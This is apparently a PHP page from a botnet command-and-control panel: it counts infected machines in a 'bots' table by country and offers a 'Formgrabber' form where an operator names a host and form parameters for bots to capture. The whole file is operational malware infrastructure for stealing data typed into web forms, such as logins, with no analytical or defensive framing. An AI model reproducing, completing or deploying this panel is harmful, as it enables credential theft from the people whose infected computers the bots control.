<?php require_once('../inc/session.php'); require_once('../inc/config.php'); require_once('../other/safe.php'); require_once('../other/rechte.php'); ?>

<script type="text/javascript">
function add(text){
    var tb = document.getElementById("countries");
    tb.value = tb.value + text;
}
</script>

<script type="text/javascript">
function check(){
	if(document.getElementById("countries").value == ""){
		return(confirm("no country selected. OK?"));
	}
}
</script>

<link rel="stylesheet" type="text/css" href="../css/style.css"/>
<link rel="stylesheet" type="text/css" href="../css/tasks.css"/>

<body onunload="opener.location.reload();">

<?php
function get_top20($limit){
$query1 = mysql_query("SELECT COUNT(*) AS count FROM bots");
				
while($row = mysql_fetch_array($query1)){
	$alle = $row[count];
}

if($limit){
	$query2 = mysql_query("SELECT * FROM bots GROUP BY country HAVING count(country) >= 1 ORDER BY count(country) DESC LIMIT 0,10");
}else{
	$query2 = mysql_query("SELECT * FROM bots GROUP BY country HAVING count(country) >= 1 ORDER BY count(country) DESC LIMIT 10,20");
}

$array = array();

while($row = mysql_fetch_array($query2)){
	$country = safe_xss($row['country']);
	$query3  = mysql_query("SELECT COUNT(*) AS count FROM bots WHERE country = '".safe_sql($country)."'");
													
	while($row = mysql_fetch_array($query3)){
		$zahl = safe_xss($row['count']);
								
		array_push($array,$zahl);

		$gesamt = $alle;
		$total  = safe_xss($zahl/$gesamt*100);
							
		if(!empty($country)){
			$countries .= '<label style="display: inline-block; width: 2em;"><img src="../img/flags/'.safe_xss($country).'.gif" OnClick="add(\''.safe_xss($country).',\');" /></label>';
		}
	}
};

return $countries;
}

	echo '<div id="title">Formgrabber</div>
		  <div id="content">
			<form action="grabber.php" method="post">
				<label for="host">Host:</label><input type="text" name="host" id="host" class="box" /><br /><br />									
				<label for="param">Parameter:</label><input type="text" name="param" id="param" class="box" /> (: zum splitten)<br /><br />		

				<p align="center"><input type="submit" name="add" value="add & close" class="button" OnClick="return check();" /></p>
			</form>
		  </div>';
		  
	if(isset($_POST['add'])){
		$host = safe_xss($_POST['host']);
		$param 	   = safe_xss($_POST['param']);
		$zs = '##############1(url)'.$host.'(/url)(param)'.$param.'(/param)##############2';
		
		$eintrag = "INSERT INTO pages (page) VALUES ('$zs')";
		$eintragen = mysql_query($eintrag);

	
		echo '<script>alert("Successfully added");parent.close();</script>';
		
	}
?>